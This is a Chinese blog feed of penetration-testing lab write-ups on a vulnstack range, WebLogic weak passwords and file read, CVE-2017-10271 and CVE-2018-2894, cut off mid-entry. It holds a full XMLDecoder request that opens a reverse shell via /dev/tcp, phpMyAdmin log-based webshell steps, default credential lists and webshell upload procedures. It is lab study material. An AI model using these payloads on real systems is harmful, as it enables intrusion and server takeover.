    <link href="/2023/11/08/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%80)/"/>
    <url>/2023/11/08/vlunstack%E9%9D%B6%E5%9C%BA(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h4 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h4><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p><p>靶机 ：192.168.129.131_centos</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904195038631.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904195038631.png" alt="image-20220904195038631"></a></p><p>image-20220904195038631</p><p>网卡设置如下：</p><p>kali（攻击机）：VMnet2</p><p>Win7(靶机）：VMnet2、VMnet3</p><p>Win2003：VMnet3</p><p>Win2008：VMnet3</p><p>登陆Win7开启phpstudy</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904195843352.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904195843352.png" alt="image-20220904195843352"></a></p><p>image-20220904195843352</p><h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>netdiscover -r 192.168.1.0&#x2F;24</p><p>发现目标IP为192.168.1.129</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904200247650.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904200247650.png" alt="image-20220904200247650"></a></p><p>image-20220904200247650</p><p>nmap -sS -sV -O 192.168.1.129</p><p>发现开启http和mysq服务</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904200729702.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904200729702.png" alt="image-20220904200729702"></a></p><p>image-20220904200729702</p><p>访问<a href="http://192.168.1.129/">http://192.168.1.129</a></p><p>发现phpStudy探针</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904200925244.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904200925244.png" alt="image-20220904200925244"></a></p><p>image-20220904200925244</p><p>使用dirmap进行扫描</p><p><a href="https://xiaojun88.github.io/2022/09/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20220904201604548.png"><img src="D:\blog2\source_posts\vlunstack靶场(一).assets\image-20220904201604548.png" alt="image-20220904201604548"></a></p><p>image-20220904201604548</p><h5 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h5><p>访问<a href="http://192.168.1.129/phpmyadmin">http://192.168.1.129/phpmyadmin</a></p><p>phpmyadmin页面getshell方式有两种：</p><p>into_outfile写shell<br>条件：需要secure_file_priv为允许</p><p>查询SHOW VARIABLES LIKE “%SECURE%”</p><p>配置未开启，这个方法不行</p><p>日志备份获取shell<br>SHOW VARIABLES LIKE “%general%”查询general_log配置</p><p>发现未开启</p><p>set global general_log&#x3D;’on’开启general log模式</p><p>SET global general_log_file&#x3D;’C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php’ 设置日志文件保存路径</p><p>SELECT ‘‘ 写入日志文件</p><p>蚁剑连接</p><h5 id="备份文件-getshell"><a href="#备份文件-getshell" class="headerlink" title="备份文件 getshell"></a>备份文件 getshell</h5><p>靶机有问题，内网环境没有配置好</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>weblogic weak password</title>
    <link href="/2023/10/28/weblogic%20weak%20password/"/>
    <url>/2023/10/28/weblogic%20weak%20password/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>通过weblogic弱口令登录后台，或者配合网站存在的任意文件读取漏洞，读取security&#x2F;SerializedSystemIni.dat（密钥）和config&#x2F;config.xml（密文），进行解密出账号和密码，然后登录后台。通过部署war包，getshell。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>weblogic全版本</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.131_centos</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821104219747.png" alt="image-20220821104219747">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821104219747.png)</p><p>image-20220821104219747</p><h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>常见的weblogicr弱口令·：</p><p>system：password</p><p>weblogic：weblogic</p><p>admin： security</p><p>joe：password</p><p>mary：password</p><p>system：security</p><p>wlcsystem：wlcsystem</p><p>wlpisystem：wlpisystem</p><p>若以上的弱口令都不行</p><p>尝试使用文件下载漏洞</p><p>访问<a href="http://192.168.129.131:7001/hello/file.jsp?path=/etc/passwd">http://192.168.129.131:7001/hello/file.jsp?path=/etc/passwd</a> 可以读取到系统账号信息，说明存在任意文件读取漏洞</p><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821105354564.png" alt="image-20220821105354564">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821105354564.png)</p><p>image-20220821105354564</p><p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。</p><p>访问 <a href="http://192.168.129.131:7001/hello/file.jsp?path=security/SerializedSystemIni.dat">http://192.168.129.131:7001/hello/file.jsp?path=security/SerializedSystemIni.dat</a> 并用burp抓包，获得密钥，将其保存到txt文件中，然后改后缀为dat</p><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821161154688.png" alt="image-20220821161154688">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821161154688.png)</p><p>image-20220821161154688</p><p>访问 <a href="http://192.168.129.131:7001/hello/file.jsp?path=config/config.xml">http://192.168.129.131:7001/hello/file.jsp?path=config/config.xml</a> 并用burp抓包，找到后台管理员账号，获得密文</p><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821161056675.png" alt="image-20220821161056675">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821161056675.png)</p><p>image-20220821161056675</p><p>下载weblogic解密工具<a href="https://github.com/TideSec/Decrypt_Weblogic_Password/blob/master/Tools5-weblogic_decrypt/weblogic_decrypt.jar">https://github.com/TideSec/Decrypt_Weblogic_Password/blob/master/Tools5-weblogic_decrypt/weblogic_decrypt.jar</a></p><p>或参考<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a></p><p>进行解密，得到密码为Oracle@123</p><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821161649428.png" alt="image-20220821161649428">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821161649428.png)</p><p>image-20220821161649428</p><p>登录后台</p><p><a href="http://192.168.129.131:7001/console/login/LoginForm.jsp">http://192.168.129.131:7001/console/login/LoginForm.jsp</a></p><p>[<img src="https://xiaojun88.github.io/2022/08/21/weblogic%20weak%20password/image-20220821162654493.png" alt="image-20220821162654493">](<a href="https://xiaojun88.github.io/2022/08/21/weblogic">https://xiaojun88.github.io/2022/08/21/weblogic</a> weak password&#x2F;image-20220821162654493.png)</p><p>image-20220821162654493</p><p>由于测试环境问题，无法登录</p><p>后续步骤为</p><p>找到 部署 -&gt; 安装 -&gt;上载文件</p><p>把木马压缩为zip格式，改后缀为war</p><p>上传war</p><p>访问 <a href="http://192.168.129.131:7001/%E6%9C%A8%E9%A9%AC%E5%90%8D/%E6%9C%A8%E9%A9%AC%E5%90%8D.jsp">http://192.168.129.131:7001/木马名/木马名.jsp</a></p><h5 id="3-关闭环境"><a href="#3-关闭环境" class="headerlink" title="3.关闭环境"></a>3.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic  10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
    <link href="/2023/10/09/Weblogic%20%2010.3.6%20&#39;wls-wsat&#39;%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
    <url>/2023/10/09/Weblogic%20%2010.3.6%20&#39;wls-wsat&#39;%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>weblogic 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.3</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p><p>靶机 ：192.168.129.131_centos</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220821094515411](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821094515411.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821094515411.png)</p><p>image-20220821094515411</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>访问：<a href="http://192.168.129.131:7001/">http://192.168.129.131:7001/</a></p><p>[![image-20220821094808823](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821094808823.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821094808823.png)</p><p>image-20220821094808823</p><p>然后访问访问<a href="http://192.168.129.131:7001/wls-wsat/CoordinatorPortType%E5%91%88%E7%8E%B0%E5%A6%82%E4%B8%8B%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%A1%A8%E7%A4%BA%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://192.168.129.131:7001/wls-wsat/CoordinatorPortType呈现如下页面，表示存在漏洞</a></p><p>[![image-20220821095034347](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821095034347.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821095034347.png)</p><p>image-20220821095034347</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>在kali中开启监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">8888</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220821095508370](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821095508370.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821095508370.png)</p><p>image-20220821095508370</p><p>然后访问<a href="http://192.168.129.131:7001/wls-wsat/CoordinatorPortType">http://192.168.129.131:7001/wls-wsat/CoordinatorPortType</a></p><p>并抓包，发到重发器，构造以下数据包，注意修改ip和port，然后发送</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.129.131:7001<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>633<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/192.168.129.130/8888 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">XML</span><br></code></pre></td></tr></table></figure><p>[![image-20220821100156594](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821100156594.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821100156594.png)</p><p>image-20220821100156594</p><p>kali成功上线</p><p>[![image-20220821100421161](D:\blog2\source_posts\Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）.assets\image-20220821100421161.png)](<a href="https://xiaojun88.github.io/2022/08/20/CVE-2017-10271%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/20/CVE-2017-10271（Weblogic</a>  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞）&#x2F;image-20220821100421161.png)</p><p>image-20220821100421161</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
    <link href="/2023/10/08/Weblogic%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/"/>
    <url>/2023/10/08/Weblogic%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>weblogic管理端未授权的两个页面（ws_utc&#x2F;begin.do和&#x2F;ws_utc&#x2F;config.do）存在任意上传jsp文件漏洞，进而获取服务器权限</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.weblogic 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p><p>2.Web Service Test Page开启</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.131_centos</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220820122239023](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820122239023.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820122239023.png)</p><h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>访问登录界面<a href="http://192.168.129.131:7001/console/login/LoginForm.jsp">http://192.168.129.131:7001/console/login/LoginForm.jsp</a></p><p>[![image-20220820132209152](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820132209152.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820132209152.png)</p><p>在靶机查看账号密码</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker-compose logs <span class="hljs-string">| grep password</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220820132421282](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820132421282.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820132421282.png)</p><p>得到账号weblogic密码OtPcP8Q6，成功登录</p><p>[![image-20220820132629273](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820132629273.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820132629273.png)</p><p>如下开启测试界面</p><p>[![image-20220820133030081](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820133030081.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820133030081.png)</p><p>[![image-20220820133101811](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820133101811.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820133101811.png)</p><p>[![image-20220820133453016](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820133453016.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820133453016.png)</p><p>[![image-20220820133520845](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820133520845.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820133520845.png)</p><p>访问测试界面</p><p><a href="http://192.168.129.131:7001/ws_utc/config.do">http://192.168.129.131:7001/ws_utc/config.do</a></p><p>把工作目录更改为以下地址</p><p>&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</p><p>[![image-20220820134008356](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820134008356.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820134008356.png)</p><p>上传蚁剑木马，并用bp抓包</p><p>[![image-20220820134439612](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820134439612.png)](<a href="https://xiaojun88.github.io/2022/08/19/CVE-2018-2894%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/19/CVE-2018-2894（Weblogic</a> 任意文件上传漏洞）&#x2F;image-20220820134439612.png)</p><p>在响应包中，查看返回的时间戳 1660974291672</p><p>[![image-20220820134749793](D:\blog2\source_posts\Weblogic 任意文件上传漏洞（CVE-2018-2894）.assets\image-20220820134749793.png)](<a 